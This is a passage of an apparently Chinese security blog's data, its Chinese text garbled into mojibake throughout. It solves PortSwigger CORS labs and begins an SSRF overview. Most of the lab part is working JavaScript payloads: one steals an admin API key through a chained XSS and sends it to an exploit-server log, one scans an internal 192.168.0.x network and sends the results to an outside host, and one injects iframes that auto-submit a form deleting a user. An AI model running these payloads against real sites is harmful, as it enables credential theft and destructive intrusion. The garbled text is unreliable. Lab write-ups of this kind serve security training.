æ­¤åœ¨å‘å‡ºè¯·æ±‚æ—¶ï¼Œæµè§ˆå™¨ä¼šåˆ›å»ºä¸€ä¸ªç©ºçš„åˆå§‹è¯·æ±‚ï¼Œå› ä¸ºæ²¡æœ‰æŒ‡å®šå…·ä½“çš„æºã€‚è¿™ä¸ªåˆå§‹è¯·æ±‚ä¸ä¼šå¯¼è‡´çœŸæ­£çš„ç½‘ç»œè¯·æ±‚ï¼Œä¹Ÿä¸ä¼šå‘é€åˆ°æœåŠ¡å™¨ã€‚å› æ­¤ï¼Œä½ è§‚å¯Ÿåˆ°çš„æ˜¯ä¸€ä¸ªç©ºçš„æºè¯·æ±‚ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ²™ç®±å±æ€§å¯ä»¥æä¾›ä¸€å®šçš„å®‰å…¨æ€§ï¼Œä½†å®ƒä»ç„¶éœ€è¦åœ¨åˆé€‚çš„åœºæ™¯å’Œæ­£ç¡®çš„ä½¿ç”¨æ–¹å¼ä¸‹æ‰èƒ½å‘æŒ¥ä½œç”¨ã€‚å¼€å‘è€…åº”è¯¥ä»”ç»†è€ƒè™‘å¹¶è¯„ä¼°æ˜¯å¦éœ€è¦ä½¿ç”¨æ²™ç®±ä»¥åŠå¦‚ä½•è®¾ç½®æ²™ç®±å±æ€§ï¼Œä»¥ç¡®ä¿å®‰å…¨æ€§å’ŒåŠŸèƒ½ä¹‹é—´çš„å¹³è¡¡ã€‚ å•å‡»\"æŸ¥çœ‹æ¼æ´åˆ©ç”¨\"ï¼ˆviewï¼‰ã€‚è§‚å¯Ÿæ¼æ´åˆ©ç”¨æ˜¯å¦æœ‰æ•ˆ-å·²ç™»å½•åˆ°æ—¥å¿—é¡µé¢ï¼ŒAPIå¯†é’¥ä½äºURLä¸­ï¼ˆæµ‹è¯•pocçš„å¯è¡Œæ€§ï¼Œå°±ä¸åœ¨è¿™æµ‹äº†ï¼Œç›´æ¥åˆ°å‘ç»™å—å®³è€…ï¼‰ è¿”å›åˆ°åˆ©ç”¨æ¼æ´æ”»å‡»æœåŠ¡å™¨å¹¶å•å‡»\"å°†åˆ©ç”¨æ¼æ´æ”»å‡»å‘é€ç»™å—å®³è€…\"ã€‚ æˆåŠŸ!!! å®éªŒä¸‰: å—ä¿¡ä»»çš„ä¸å®‰å…¨åè®®çš„CORSæ¼æ´ æç¤º: 1ã€æ­¤ç½‘ç«™å…·æœ‰ä¸å®‰å…¨çš„CORSé…ç½®ï¼Œå› ä¸ºå®ƒä¿¡ä»»æ‰€æœ‰å­åŸŸï¼Œè€Œä¸ç®¡åè®®å¦‚ä½•ã€‚ 2ã€è§£å†³å®éªŒï¼šç¼–åˆ¶JavaScriptï¼Œä½¿ç”¨CORSæ£€ç´¢ç®¡ç†å‘˜çš„APIå¯†é’¥å¹¶å°†ä»£ç ä¸Šè½½åˆ°æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ã€‚å¹¶æäº¤api key 3ã€å·²æœ‰è´¦å·ï¼šwiener:peter å¦‚ä¸Šå›¾,ä¾æ—§å¯èƒ½å­˜åœ¨CORSæ¼æ´,å‘é€åˆ°é‡å‘å™¨éªŒè¯ æ­¤æ—¶å°†originæ ‡å¤´æ”¹ä¸º: Origin:http://subdomain.lab-id ï¼ˆlab-id æ˜¯å®éªŒå®¤åŸŸåï¼‰ æˆ‘çš„æ˜¯ï¼š Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.net å¦‚ä¸Šå›¾æˆåŠŸå‘ç°åˆ©ç”¨æ¼æ´(å‘ç°å…¶ä»»æ„å­åŸŸéƒ½å¯ä»¥è®¿é—®) ç»„åˆåˆ©ç”¨ æ‰“å¼€ä¸€ä¸ªäº§å“é¡µé¢ï¼Œå•å‡»Check stockå¹¶è§‚å¯Ÿå®ƒæ˜¯ä½¿ç”¨ä¸€ä¸ªå­åŸŸä¸Šçš„HTTP URLåŠ è½½çš„ æ¥ä¸‹æ¥éªŒè¯è¯¥å­åŸŸæ˜¯å¦å­˜åœ¨XSSæ¼æ´,å¦‚ä¸‹å›¾,å“åº”ä¸­å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬çš„æ¶æ„ä»£ç è¿›è¡ŒæŸäº›å¿…è¦çš„ç¼–ç è¿‡æ»¤,å› æ­¤çš„ç¡®å­˜åœ¨XSSæ¼æ´ åœ¨æµè§ˆå™¨ä¸­ï¼Œè½¬åˆ°æ¼æ´åˆ©ç”¨æœåŠ¡å™¨å¹¶è¾“å…¥ä»¥ä¸‹HTMLï¼Œå°†YOUR-LAB-IDæ›¿æ¢ä¸ºæ‚¨çš„å”¯ä¸€å®éªŒå®¤URLï¼Œå°†YOUR-EXPLOIT-SERVER-IDæ›¿æ¢ä¸ºæ‚¨çš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨IDï¼š &lt;script&gt; document.location=\"http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1\" &lt;/script&gt; æˆ‘çš„æ˜¯ï¼š &lt;script&gt; document.location=\"http://stock.0a9800610460650c822b3861005c0050.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a9800610460650c822b3861005c0050.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6c00a2045f65df82f537b4017f003e.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1\" &lt;/script&gt; å®éªŒå››: CORSæ¼æ´ä¸å†…éƒ¨ç½‘ç»œæ¢è½´æ”»å‡» æç¤º: 1ã€æ­¤ç½‘ç«™å…·æœ‰ä¸å®‰å…¨çš„CORSé…ç½®ï¼Œå› ä¸ºå®ƒä¿¡ä»»æ‰€æœ‰å†…éƒ¨ç½‘ç»œæ¥æºã€‚ 2ã€å®Œæˆå®éªŒï¼šç¼–åˆ¶JavaScriptæ¥å®šä½æœ¬åœ°ç½‘ç»œï¼ˆ192.168.0.0/24ï¼Œç«¯å£8080ï¼‰ä¸Šçš„ç«¯ç‚¹ï¼Œç„¶åä½¿ç”¨è¯¥ç«¯ç‚¹æ¥è¯†åˆ«å’Œåˆ›å»ºåŸºäºCORSçš„æ”»å‡»ä»¥åˆ é™¤ç”¨æˆ·ã€‚åˆ é™¤ç”¨æˆ·Carlosåï¼Œå®éªŒå°†å¾—åˆ°è§£å†³ã€‚ part1: éœ€è¦æ‰«ææœ¬åœ°ç½‘ç»œä»¥æŸ¥æ‰¾ç«¯ç‚¹ã€‚å°†$collaboratorPayloadæ›¿æ¢ä¸ºCollaboratoræœ‰æ•ˆè´Ÿè½½æˆ–æ¼æ´åˆ©ç”¨æœåŠ¡å™¨URL &lt;script&gt; var q = [], collaboratorURL = 'http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/'; for(i=1;i&lt;=255;i++) { q.push(function(url) { return function(wait) { fetchUrl(url, wait); } }('http://192.168.0.'+i+':8080')); } for(i=1;i&lt;=20;i++){ if(q.length)q.shift()(i*100); } function fetchUrl(url, wait) { var controller = new AbortController(), signal = controller.signal; fetch(url, {signal}).then(r =&gt; r.text().then(text =&gt; { location = collaboratorURL + '?ip='+url.replace(/^http:\\/\\//,'')+'&amp;code='+encodeURIComponent(text)+'&amp;'+Date.now(); })) .catch(e =&gt; { if(q.length) { q.shift()(wait); } }); setTimeout(x =&gt; { controller.abort(); if(q.length) { q.shift()(wait); } }, wait); } &lt;/script&gt; ä¸Šè¿°ä»£ç è§£æï¼šGPTå›ç­” è§£æï¼š 1.å®šä¹‰äº†ä¸€ä¸ªç©ºæ•°ç»„ q ç”¨äºå­˜å‚¨å¼‚æ­¥è¯·æ±‚çš„é˜Ÿåˆ—ã€‚ 2.å®šä¹‰äº†ä¸€ä¸ª collaboratorURL å˜é‡ï¼ŒæŒ‡å®šäº†åä½œè€…çš„ URLã€‚ 3.ä½¿ç”¨ä¸€ä¸ª for å¾ªç¯ä» 1 åˆ° 255ï¼Œç”Ÿæˆäº†ä¸€ç³»åˆ—å‡½æ•°ï¼Œå¹¶å°†è¿™äº›å‡½æ•°æ·»åŠ åˆ°é˜Ÿåˆ— q ä¸­ã€‚æ¯ä¸ªç”Ÿæˆçš„å‡½æ•°å°†è°ƒç”¨ fetchUrl(url, wait) å‡½æ•°ï¼Œå¹¶å°†ä¸åŒçš„ IP åœ°å€ç»„åˆæˆä¸€ä¸ª URLã€‚ 4.ä½¿ç”¨å¦ä¸€ä¸ª for å¾ªç¯ä» 1 åˆ° 20ï¼Œä¸æ–­ä»é˜Ÿåˆ— q ä¸­å–å‡ºå‡½æ•°ï¼Œå¹¶è°ƒç”¨å®ƒä»¬ï¼Œä¼ é€’ä¸åŒçš„ç­‰å¾…æ—¶é—´å‚æ•°ã€‚ 5.å®šä¹‰äº†ä¸€ä¸ª fetchUrl(url, wait) å‡½æ•°ï¼Œç”¨äºå‘èµ·å¼‚æ­¥è¯·æ±‚ã€‚ 6.åˆ›å»ºäº†ä¸€ä¸ª AbortController å¯¹è±¡å’Œå¯¹åº”çš„ signal ä¿¡å·ã€‚ 7.ä½¿ç”¨ fetch å‡½æ•°å‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ°æŒ‡å®šçš„ URLï¼Œå¹¶æŒ‡å®š signal ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¯·æ±‚é€‰é¡¹ã€‚ 8.å½“è¯·æ±‚æˆåŠŸè¿”å›æ—¶ï¼Œå°†å“åº”çš„æ–‡æœ¬å†…å®¹ä½œä¸ºå‚æ•°æ‹¼æ¥åˆ°æŒ‡å®šçš„åä½œè€… URLï¼Œå¹¶è¿›è¡Œé‡å®šå‘ã€‚ 9.å¦‚æœè¯·æ±‚å¤±è´¥ï¼Œåˆ™åˆ¤æ–­é˜Ÿåˆ— q æ˜¯å¦è¿˜æœ‰å‰©ä½™çš„å‡½æ•°ï¼Œå¦‚æœæœ‰ï¼Œåˆ™å–å‡ºä¸‹ä¸€ä¸ªå‡½æ•°å¹¶æ‰§è¡Œã€‚ 10.ä½¿ç”¨ setTimeout è®¾ç½®ä¸€ä¸ªè¶…æ—¶å®šæ—¶å™¨ï¼Œå½“è¶…æ—¶æ—¶ï¼Œç»ˆæ­¢è¯·æ±‚å¹¶æ‰§è¡Œä¸ä¸Šè¿°ç›¸åŒçš„å¤„ç†é€»è¾‘ã€‚ è¿™æ®µä»£ç çš„ç›®çš„æ˜¯é€šè¿‡å¾ªç¯å¼‚æ­¥è¯·æ±‚æ¥å°è¯•è®¿é—®æœ¬åœ°ç½‘ç»œä¸­çš„ HTTP æœåŠ¡ï¼Œå¹¶å°†å“åº”çš„æ–‡æœ¬å†…å®¹å‘é€åˆ°åä½œè€…çš„æœåŠ¡å™¨ã€‚ åœ¨æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­è¾“å…¥ä»¥ä¸‹ä»£ç ã€‚å•å‡»å­˜å‚¨ï¼Œç„¶åå•å‡»â€œå°†æ¼æ´åˆ©ç”¨å‘é€ç»™å—å®³è€…â€ã€‚ æ£€æŸ¥æ—¥å¿—æˆ–Collaboratoräº¤äº’ç»„ä»¶ï¼Œå¹¶æŸ¥çœ‹å‘é€ç»™å®ƒçš„ä»£ç å‚æ•° å‘ç°: 192.168.0.175:8080 part2: é‡æ–°åœ¨åˆ©ç”¨æ¼æ´æ”»å‡»æœåŠ¡å™¨ä¸­è¾“å…¥ä»¥ä¸‹ä»£ç ã€‚å°†$ipæ›¿æ¢ä¸ºä»åä½œè€…äº¤äº’ä¸­æ£€ç´¢åˆ°çš„IPåœ°å€å’Œç«¯å£å·ã€‚ä¸è¦å¿˜è®°æ·»åŠ Collaboratoræœ‰æ•ˆè´Ÿè½½æˆ–å†æ¬¡åˆ©ç”¨æœåŠ¡å™¨URLã€‚æ›´æ–°å¹¶æä¾›æ¼æ´åˆ©ç”¨ã€‚ &lt;script&gt; function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1]; } function fetchUrl(url, collaboratorURL){ fetch(url).then(r =&gt; r.text().then(text =&gt; { xss(url, text, '\"&gt;&lt;img src='+collaboratorURL+'?foundXSS=1&gt;'); })) } fetchUrl(\"http://192.168.0.175:8080\", \"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/\"); &lt;/script&gt; ä»£ç è§£æï¼šGPTå›ç­” è§£æï¼š 1.å®šä¹‰äº†ä¸€ä¸ª xss(url, text, vector) å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œ XSS æ”»å‡»ã€‚ 2.æ„é€ äº†ä¸€ä¸ªå¸¦æœ‰æ¶æ„ XSS è„šæœ¬çš„ URLï¼Œè¯¥ URL åŒ…å«äº†ç›®æ ‡ç½‘ç«™çš„ç™»å½•é¡µé¢åœ°å€ã€æ—¶é—´æˆ³ã€æ¶æ„ç”¨æˆ·åå’Œå¯†ç ã€ä»¥åŠæ¥è‡ªç›®æ ‡ç½‘ç«™çš„ CSRF ä»¤ç‰Œã€‚ 3.å°†å½“å‰é¡µé¢çš„ location è®¾ç½®ä¸ºæ„é€ çš„æ¶æ„ URLï¼Œä»è€Œå®ç°è·³è½¬å’Œæ³¨å…¥æ¶æ„è„šæœ¬çš„ç›®çš„ã€‚ 4.å®šä¹‰äº†ä¸€ä¸ª fetchUrl(url, collaboratorURL) å‡½æ•°ï¼Œç”¨äºå‘é€å¼‚æ­¥è¯·æ±‚è·å–ç›®æ ‡ URL çš„å“åº”å†…å®¹ï¼Œå¹¶è§¦å‘ XSS æ”»å‡»ã€‚ 5.ä½¿ç”¨ fetch å‡½æ•°å‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ°ç›®æ ‡ URLï¼Œå¹¶è·å–å“åº”çš„æ–‡æœ¬å†…å®¹ã€‚ 6.åœ¨å“åº”è¿”å›æ—¶ï¼Œå°†ç›®æ ‡ URLã€å“åº”æ–‡æœ¬å’Œæ¶æ„å‘é‡ä½œä¸ºå‚æ•°ä¼ é€’ç»™ xss å‡½æ•°ï¼Œä»¥è§¦å‘ XSS æ”»å‡»ã€‚ 7.è°ƒç”¨ fetchUrl å‡½æ•°ï¼Œä¼ é€’ç›®æ ‡ URL å’Œåä½œè€… URL ä½œä¸ºå‚æ•°ï¼Œä»¥å‘èµ·å¼‚æ­¥è¯·æ±‚å¹¶è§¦å‘ XSS æ”»å‡»ã€‚ è¿™æ®µä»£ç çš„ç›®çš„æ˜¯é€šè¿‡å‘é€å¼‚æ­¥è¯·æ±‚æ¥è·å–ç›®æ ‡ç½‘ç«™çš„å“åº”å†…å®¹ï¼Œå¹¶åœ¨å“åº”å†…å®¹ä¸­æ³¨å…¥æ¶æ„çš„ XSS è„šæœ¬ä»£ç ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ç™»å½• URLï¼Œå¹¶å°†å½“å‰é¡µé¢çš„ location è®¾ç½®ä¸ºè¯¥ URLï¼Œå½“ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œæ¶æ„çš„ XSS è„šæœ¬å°†æ‰§è¡Œå¹¶åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šæ‰§è¡Œæ”»å‡»è€…æ‰€æœŸæœ›çš„æ“ä½œã€‚ ç°åœ¨æˆ‘ä»¬å°†æ¢æµ‹ç”¨æˆ·åå­—æ®µä¸­çš„XSSæ¼æ´ã€‚ æ£€ç´¢URLä¸­å…·æœ‰foundXSS=1çš„Collaboratoräº¤äº’ï¼›æˆ–è€…åœ¨æ—¥å¿—ä¸­çœ‹åˆ°foundXSS=1 part3: é‡æ–°åœ¨åˆ©ç”¨æ¼æ´æ”»å‡»æœåŠ¡å™¨ä¸­è¾“å…¥ä»¥ä¸‹ä»£ç ã€‚å°†$ipæ›¿æ¢ä¸ºä¸æ­¥éª¤2ä¸­ç›¸åŒçš„IPåœ°å€å’Œç«¯å£å·ï¼Œå†æ¬¡æ·»åŠ Collaboratoræœ‰æ•ˆè´Ÿè½½æˆ–æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ã€‚æ›´æ–°å¹¶æä¾›æ¼æ´åˆ©ç”¨ &lt;script&gt; function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1]; } function fetchUrl(url, collaboratorURL){ fetch(url).then(r=&gt;r.text().then(text=&gt; { xss(url, text, '\"&gt;&lt;iframe src=/admin onload=\"new Image().src=\\''+collaboratorURL+'?code=\\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)\"&gt;'); } )) } fetchUrl(\"http://192.168.0.175:8080\", \"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/\"); &lt;/script&gt; Collaboratoräº¤äº’æˆ–åˆ©ç”¨æœåŠ¡å™¨æ—¥å¿—ä¼šæä¾›ç®¡ç†é¡µé¢çš„æºä»£ç  part4ï¼š æ£€ç´¢æºä»£ç ï¼Œä¼šæ³¨æ„åˆ°æœ‰ä¸€ä¸ªå…è®¸åˆ é™¤ç”¨æˆ·çš„è¡¨å•ã€‚é‡æ–°åœ¨åˆ©ç”¨æ¼æ´æ”»å‡»æœåŠ¡å™¨ä¸­è¾“å…¥ä»¥ä¸‹ä»£ç ã€‚å°†$ipæ›¿æ¢ä¸ºç›¸åŒçš„IPåœ°å€å’Œç«¯å£å·ã€‚ // æºä»£ç  &lt;script src=\"/resources/labheader/js/labHeader.js\"&gt;&lt;/script&gt; &lt;div id=\"academyLabHeader\"&gt; &lt;section class=\"academyLabBanner\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"logo\"&gt;&lt;/div&gt; &lt;div class=\"title-container\"&gt; &lt;h2&gt;CORS vulnerability with internal network pivot attack&lt;/h2&gt; &lt;a id=\"exploit-link\" class=\"button\" target=\"_blank\" href=\"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net\"&gt;Go to exploit server&lt;/a&gt; &lt;a class=\"link-back\" href=\"https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack\"&gt; Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;description&amp;nbsp; &lt;svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" viewBox=\"0 0 28 30\" enable-background=\"new 0 0 28 30\" xml:space=\"preserve\" title=\"back-arrow\"&gt; &lt;g&gt; &lt;polygon points=\"1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\"&gt;&lt;/polygon&gt; &lt;polygon points=\"14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\"&gt;&lt;/polygon&gt; &lt;/g&gt; &lt;/svg&gt; &lt;/a&gt; &lt;/div&gt; &lt;div class=\"widgetcontainer-lab-status is-notsolved\"&gt; &lt;span&gt;LAB&lt;/span&gt; &lt;p&gt;Not solved&lt;/p&gt; &lt;span class=\"lab-status-icon\"&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/section&gt;&lt;/div&gt; &lt;div theme=\"\"&gt; &lt;section class=\"maincontainer\"&gt; &lt;div class=\"container is-page\"&gt; &lt;header class=\"navigation-header\"&gt; &lt;section class=\"top-links\"&gt; &lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt; &lt;a href=\"/admin\"&gt;Admin panel&lt;/a&gt;&lt;p&gt;|&lt;/p&gt; &lt;a href=\"/my-account?id=administrator\"&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt; &lt;/section&gt; &lt;/header&gt; &lt;header class=\"notification-header\"&gt; &lt;/header&gt; &lt;form style=\"margin-top: 1em\" class=\"login-form\" action=\"/admin/delete\" method=\"POST\"&gt; &lt;input required=\"\" type=\"hidden\" name=\"csrf\" value=\"Mn2Dj8wVciUoD89vrl36Io4lkfpFQQG0\"&gt; &lt;label&gt;Username&lt;/label&gt; &lt;input required=\"\" type=\"text\" name=\"username\"&gt; &lt;button class=\"button\" type=\"submit\"&gt;Delete user&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/section&gt; &lt;/div&gt; HTTP/1.1\" 200 \"User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\" // è„šæœ¬ &lt;script&gt; function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf\" value=\"([^\"]+)\"/)[1]; } function fetchUrl(url){ fetch(url).then(r=&gt;r.text().then(text=&gt; { xss(url, text, '\"&gt;&lt;iframe src=/admin onload=\"var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\\'carlos\\',f.submit()\"&gt;'); } )) } fetchUrl(\"http://192.168.0.175:8080\"); &lt;/script&gt; ä»£ç è§£æï¼šGPTå›ç­” è§£æï¼š 1.å®šä¹‰äº†ä¸€ä¸ª xss(url, text, vector) å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œ XSS æ”»å‡»ã€‚ 2.æ„é€ äº†ä¸€ä¸ªå¸¦æœ‰æ¶æ„ XSS è„šæœ¬çš„ URLï¼Œè¯¥ URL åŒ…å«äº†ç›®æ ‡ç½‘ç«™çš„ç™»å½•é¡µé¢åœ°å€ã€æ—¶é—´æˆ³ã€æ¶æ„ç”¨æˆ·åå’Œå¯†ç ã€ä»¥åŠæ¥è‡ªç›®æ ‡ç½‘ç«™çš„ CSRF ä»¤ç‰Œã€‚ 3.å°†å½“å‰é¡µé¢çš„ location è®¾ç½®ä¸ºæ„é€ çš„æ¶æ„ URLï¼Œä»è€Œå®ç°è·³è½¬å’Œæ³¨å…¥æ¶æ„è„šæœ¬çš„ç›®çš„ã€‚ 4.å®šä¹‰äº†ä¸€ä¸ª fetchUrl(url) å‡½æ•°ï¼Œç”¨äºå‘é€å¼‚æ­¥è¯·æ±‚è·å–ç›®æ ‡ URL çš„å“åº”å†…å®¹ï¼Œå¹¶è§¦å‘ XSS æ”»å‡»ã€‚ 5.ä½¿ç”¨ fetch å‡½æ•°å‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ°ç›®æ ‡ URLï¼Œå¹¶è·å–å“åº”çš„æ–‡æœ¬å†…å®¹ã€‚ 6.åœ¨å“åº”è¿”å›æ—¶ï¼Œå°†ç›®æ ‡ URLã€å“åº”æ–‡æœ¬å’Œæ¶æ„å‘é‡ä½œä¸ºå‚æ•°ä¼ é€’ç»™ xss å‡½æ•°ï¼Œä»¥è§¦å‘ XSS æ”»å‡»ã€‚ 7.åœ¨æ„é€ æ¶æ„å‘é‡æ—¶ï¼Œä½¿ç”¨äº†ä¸€ä¸ªåŒ…å« &lt;iframe&gt; å…ƒç´ çš„æ¶æ„ XSS è„šæœ¬ä»£ç ã€‚è¯¥ &lt;iframe&gt; å…ƒç´ çš„ src å±æ€§è®¾ç½®ä¸º /adminï¼Œå¹¶åœ¨åŠ è½½å®Œæˆæ—¶è§¦å‘ä¸€ä¸ª JavaScript ä»£ç ï¼Œè¯¥ä»£ç ä¼šæ‰¾åˆ°ç›®æ ‡é¡µé¢ä¸­çš„è¡¨å•ï¼Œå°†ç”¨æˆ·åå­—æ®µï¼ˆå¦‚æœå­˜åœ¨ï¼‰è®¾ç½®ä¸º 'carlos'ï¼Œç„¶åè‡ªåŠ¨æäº¤è¡¨å•ã€‚ 8.è°ƒç”¨ fetchUrl å‡½æ•°ï¼Œä¼ é€’ç›®æ ‡ URL ä½œä¸ºå‚æ•°ï¼Œä»¥å‘èµ·å¼‚æ­¥è¯·æ±‚å¹¶è§¦å‘ XSS æ”»å‡»ã€‚ è¿™æ®µä»£ç çš„ç›®çš„æ˜¯é€šè¿‡å‘é€å¼‚æ­¥è¯·æ±‚æ¥è·å–ç›®æ ‡ç½‘ç«™çš„å“åº”å†…å®¹ï¼Œå¹¶åœ¨å“åº”å†…å®¹ä¸­æ³¨å…¥æ¶æ„çš„ XSS è„šæœ¬ä»£ç ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ç™»å½• URLï¼Œå¹¶å°†å½“å‰é¡µé¢çš„ location è®¾ç½®ä¸ºè¯¥ URLï¼Œå½“ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œæ¶æ„çš„ XSS è„šæœ¬å°†æ‰§è¡Œå¹¶åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šæ‰§è¡Œæ”»å‡»è€…æ‰€æœŸæœ›çš„æ“ä½œã€‚ ä»£ç é€šè¿‡æ³¨å…¥ä¸€ä¸ªæŒ‡å‘/adminé¡µé¢çš„iframeæäº¤è¡¨å•ä»¥åˆ é™¤carlos è¯¦æƒ…å‚è€ƒ: https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502","categories":["å¸¸è§topæ¼æ´"]},{"title":"ssrfæ¼æ´æ€»ç»“","path":"/2023/07/26/qian-xi-ssrf-lou-dong/","content":"ssrfæ¼æ´æ€»ç»“ ä¸€ã€SSRFæ˜¯ä»€ä¹ˆï¼Ÿ SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ äºŒã€SSRFæ¼æ´åŸç† SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚ æ¯”å¦‚,é»‘å®¢æ“ä½œæœåŠ¡ç«¯ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚ssrfæ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶ å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ® æ•°æ®æµ:æ”»å‡»è€…-----&gt;æœåŠ¡å™¨----&gt;ç›®æ ‡åœ°å€ å³ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡ï¼ˆå­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ï¼‰ï¼Œå½“ä½œè·³æ¿æ¥æ”»å‡»å…¶ä»–æœåŠ¡å™¨ã€‚ æˆ‘çš„ç†è§£æ˜¯æ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªå­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ï¼ˆæœåŠ¡å™¨ï¼‰ï¼Œè€Œè¯¥æœåŠ¡å™¨å¯ä»¥è®¿é—®å—å®³è€…çš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯¹webåº”ç”¨å‘èµ·ä¸€ç§è¯·æ±‚ï¼ˆè¦è·å–å—å®³è€…æœåŠ¡å™¨å†…ç½‘èµ„æºçš„è¯·æ±‚ï¼‰ï¼Œè¯¥webåº”ç”¨ç”±äºå¯¹è¯¥è¯·æ±‚æ²¡æœ‰åšå‡ºä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè¢«è®¤ä¸ºè¯¥è¯·æ±‚æ˜¯å®‰å…¨çš„ï¼Œè¿”å›å—å®³è€…æœåŠ¡å™¨çš„å†…éƒ¨èµ„æºå’Œæ•°æ® 